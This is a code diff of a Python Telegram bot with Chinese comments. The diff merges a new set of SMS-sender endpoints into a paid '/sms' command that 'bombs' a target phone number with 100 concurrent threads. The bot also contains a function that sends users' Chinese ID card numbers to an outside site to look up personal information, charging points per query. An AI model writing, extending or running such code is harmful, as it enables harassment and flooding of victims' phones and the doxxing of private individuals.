@@ -11,6 +11,7 @@ import random
 import concurrent.futures
 import inspect  
 import sms_list 
+import sms_list_new  # 引入新接口文件
 from sms_list import *
 from Crypto.Cipher import DES3
 from datetime import datetime
@@ -84,18 +85,14 @@ def decrypt_data(encrypted_text_hex, key):
     except (binascii.Error, ValueError, json.JSONDecodeError) as e:
         return {"error": str(e)}
 
-# --- 新加：cyh 接口逻辑 ---
 def xiaowunb_query_logic(chat_id, id_number, uid):
     base_url = "http://xiaowunb.top/cyh.php"
     params = {"sfz": id_number}
     try:
         response = requests.get(base_url, params=params, timeout=10)
         response.encoding = 'utf-8'
-        
-        # 扣除 2.5 积分
         user_points[uid] -= 2.5
         save_points()
-        
         res_text = response.text if response.text.strip() else "查询结果为空"
         result_message = f"📑 **身份查询结果**\n\n{res_text}\n\n已扣除 **2.5** 积分！\n当前余额: **{user_points[uid]:.2f}**"
         bot.send_message(chat_id, result_message, parse_mode='Markdown')
@@ -223,10 +220,11 @@ def run_batch_task(chat_id, msg_id, name, id_list, uid):
     except: pass
     bot.send_message(chat_id, success_match if success_match else "❌ **未发现匹配结果**", parse_mode='Markdown')
 
-# ================= 5. 短信轰炸 (保持原样) =================
+# ================= 5. 短信轰炸 (整合新旧接口) =================
 
 def get_all_senders():
     all_funcs = []
+    # 1. 获取旧文件 sms_list.py 中的函数
     excludes = ['generate_random_user_agent', 'replace_phone_in_data', 'platform_request_worker', 'send_minute_request', 'get_current_timestamp']
     for name, obj in inspect.getmembers(sms_list):
         if inspect.isfunction(obj) and name not in excludes:
@@ -234,6 +232,13 @@ def get_all_senders():
                 sig = inspect.signature(obj)
                 if len(sig.parameters) >= 1: all_funcs.append(obj)
             except: pass
+    
+    # 2. 获取新文件 sms_list_new.py 中的列表接口
+    if hasattr(sms_list_new, 'NEW_PLATFORMS'):
+        for name, func in sms_list_new.NEW_PLATFORMS:
+            if func not in all_funcs:
+                all_funcs.append(func)
+                
     return all_funcs
 
 @bot.message_handler(commands=['sms'])
@@ -244,9 +249,11 @@ def sms_bomb_cmd(message):
     if len(parts) < 2: return bot.reply_to(message, "用法: `/sms 手机号`")
     target = parts[1]
     if not (len(target) == 11 and target.isdigit()): return bot.reply_to(message, "⚠️ 手机号格式错误")
+    
     all_funcs = get_all_senders()
     bot.reply_to(message, f"🎯 **接口装载：{len(all_funcs)}个**\n正在轰炸 `{target}`...", parse_mode='Markdown')
     user_points[uid] -= 5.5; save_points()
+    
     def do_bomb():
         random.shuffle(all_funcs)
         with concurrent.futures.ThreadPoolExecutor(max_workers=100) as executor:
@@ -317,9 +324,7 @@ def handle_all(message):
     uid, chat_id, text = message.from_user.id, message.chat.id, message.text.strip()
     if text.startswith('/'): return 
     
-    # 逻辑识别：如果是直接发身份证/手机号 (默认跑河北查询)
     if re.match(r'^1[3-9]\d{9}$', text) or re.match(r'^\d{17}[\dXx]$', text):
-        # 检查是否处于 cyh 指令的下一步状态
         state = user_states.get(chat_id)
         if state and state['step'] == 'cyh_id':
             del user_states[chat_id]
